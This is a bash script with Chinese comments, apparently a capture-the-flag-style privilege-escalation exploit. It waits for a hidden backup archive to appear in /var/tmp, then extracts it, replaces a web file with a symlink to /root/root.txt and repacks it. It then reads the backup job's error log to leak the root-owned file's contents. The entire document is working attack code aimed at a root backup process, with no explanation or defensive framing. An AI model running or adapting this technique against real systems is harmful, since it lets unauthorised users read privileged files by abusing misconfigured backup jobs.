#!/bin/bash

# 在 /dev/shm 中工作以提高 I/O 性能
cd /dev/shm

# 設置 start 和 cur 變量為任何在 /var/tmp 中的備份文件
start=$(find /var/tmp -maxdepth 1 -type f -name ".*")
cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")

# 循環直到 cur 發生變化
echo "等待存檔文件名變更..."
while [ "$start" == "$cur" ] || [ -z "$cur" ]; do
    sleep 10
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")
done

# 獲取存檔的副本
echo "文件已變更...複製到此處"
cp "$cur" .

# 獲取文件名
fn=$(basename "$cur")

# 解壓存檔
tar -zxf "$fn"

# 刪除 robots.txt 並用指向 root.txt 的鏈接替換
rm var/www/html/robots.txt
ln -s /root/root.txt var/www/html/robots.txt

# 刪除舊存檔
rm "$fn"

# 創建新存檔
tar czf "$fn" var

# 放回原處並清理
mv "$fn" "$cur"
rm "$fn"
rm -rf var

# 等待結果
echo "等待新日誌..."
tail -f /var/backups/onuma_backup_error.txt
